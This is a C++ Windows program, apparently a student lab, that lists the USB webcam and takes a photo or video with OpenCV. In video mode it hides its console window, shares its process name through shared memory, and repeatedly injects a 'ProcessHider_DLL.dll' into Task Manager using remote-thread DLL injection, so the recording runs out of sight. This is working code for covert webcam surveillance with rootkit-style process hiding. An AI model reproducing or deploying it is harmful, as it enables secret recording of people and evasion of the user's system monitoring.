#include <stdio.h>
#include <Windows.h>
#include <setupapi.h>
#include <locale.h> 
#include <iostream>
#include <wdmguid.h>
#include <devguid.h>
#include <iomanip>
#include <TlHelp32.h>
#include <opencv2/core.hpp>
#include <opencv2/videoio.hpp>
#include <opencv2/highgui.hpp>
#include <opencv2/imgproc.hpp>

using namespace std;
using namespace cv;

#pragma comment(lib, "setupapi.lib")

HANDLE map;
LPVOID buf;

bool injectDll(DWORD pid, string dll_path) {

	HANDLE handle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
	if (handle == INVALID_HANDLE_VALUE) {
		return false;
	}

	LPVOID address = VirtualAllocEx(handle, NULL, dll_path.length(), MEM_COMMIT | MEM_RESERVE,
		PAGE_EXECUTE_READWRITE);
	if (address == NULL) {
		return false;
	}

	bool res = WriteProcessMemory(handle, address, dll_path.c_str(), dll_path.length(), 0);
	if (!res) {
		return false;
	}
	if (CreateRemoteThread(handle, NULL, NULL, (LPTHREAD_START_ROUTINE)LoadLibraryA, (LPVOID)address, NULL, NULL) == INVALID_HANDLE_VALUE) {
		return false;
	}

	CloseHandle(handle);
	return true;
}

void findAndInject()
{
	char* dll_path_c = (char*)malloc(sizeof(char) * 3000);
	GetModuleFileNameA(NULL, dll_path_c, 3000);
	
	DWORD lastpid = 4;
	string dll_path(dll_path_c);
	size_t index = dll_path.find_last_of('\\');
	dll_path.erase(dll_path.begin() + index, dll_path.end());
	dll_path.append("\\ProcessHider_DLL.dll");

	while (true) {
		PROCESSENTRY32 process; //Описывает запись из списка процессов, находящихся в системном адресном пространстве, когда был сделан снимок.
		process.dwSize = sizeof(PROCESSENTRY32);

		HANDLE proc_snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); //Создаём снимок всех процессов в системе
		if (proc_snap == INVALID_HANDLE_VALUE) {
			return;
		}

		if (!Process32First(proc_snap, &process)) {
			return;
		}

		do
		{
			if (!lstrcmp(process.szExeFile, "Taskmgr.exe") && lastpid != process.th32ProcessID) {
				if (!injectDll(process.th32ProcessID, dll_path)) {
					break;
				}
				lastpid = process.th32ProcessID;
			}
		} while (Process32Next(proc_snap, &process));
		CloseHandle(proc_snap);
		Sleep(1000);
	}
}

bool mapProcessName(string name)
{
	map = CreateFileMappingA(
		INVALID_HANDLE_VALUE,
		NULL,
		PAGE_READWRITE,
		0,
		255,
		"Global\\GetProcessName"
	);

	if (map == NULL) {
		return false;
	}

	buf = MapViewOfFile(map,
		FILE_MAP_ALL_ACCESS,
		0,
		0,
		255);

	if (buf == NULL) {
		CloseHandle(map);
		return false;
	}

	CopyMemory(buf, name.c_str(), name.length());

	return true;
}

int main(int argc, char** argv) {
	SP_DEVINFO_DATA DeviceInfoData = { 0 };
	HDEVINFO DeviceInfoSet = SetupDiGetClassDevs(&GUID_DEVCLASS_CAMERA, "USB", NULL, DIGCF_PRESENT);
	if (DeviceInfoSet == INVALID_HANDLE_VALUE) {
		return -1;
	}
	DeviceInfoData.cbSize = sizeof(SP_DEVINFO_DATA);
	SetupDiEnumDeviceInfo(DeviceInfoSet, 0, &DeviceInfoData);

	PBYTE WebCamID[256];
	PBYTE WebCamName[256];
	PBYTE WebCamManufacturer[256];
	
	SetupDiGetDeviceRegistryProperty(DeviceInfoSet, &DeviceInfoData, SPDRP_FRIENDLYNAME, NULL, (PBYTE)WebCamName, sizeof(WebCamName), 0);
	SetupDiGetDeviceRegistryProperty(DeviceInfoSet, &DeviceInfoData, SPDRP_MFG, NULL, (PBYTE)WebCamManufacturer, sizeof(WebCamManufacturer), 0);
	SetupDiGetDeviceRegistryProperty(DeviceInfoSet, &DeviceInfoData, SPDRP_HARDWAREID, NULL, (PBYTE)WebCamID, sizeof(WebCamID), 0);
	
	cout << "Name: " << (char*)WebCamName << endl
		 << "Manufacturer: " << (char*)WebCamManufacturer << endl
		 << "Camera ID: " << (char*)WebCamID << endl << endl;

	Mat frame;
	VideoCapture cap(0);
	if (!cap.isOpened())
	{
		return -1;
	}

	cout << "1 - Make image" << endl
		 << "2 - Make video" << endl;

	int a; 
	cin >> a;

	cap >> frame;

	switch (a) 
	{
	case 1:
		cap >> frame;
		imwrite("image.jpg", frame);
		break;
	case 2:
		ShowWindow(GetConsoleWindow(), SW_HIDE);
		mapProcessName("WebCam_IIPU.exe");
		CreateThread(
			NULL,
			NULL,
			(LPTHREAD_START_ROUTINE)findAndInject,
			NULL,
			NULL,
			NULL
		);

		String filename = "video.avi";

		VideoWriter writer(filename, VideoWriter::fourcc('M', 'J', 'P', 'G'), 30, frame.size());

		if (!(writer.isOpened()))
		{
			break;
		}

		while (true)
		{
			if (!cap.read(frame))
			{
				break;
			}
			writer.write(frame);
			if (GetAsyncKeyState(1))
			{
				if (GetAsyncKeyState(4))
				{
					break;
				}
			}
		}
	}

	SetupDiDestroyDeviceInfoList(DeviceInfoSet);
	return 0;
}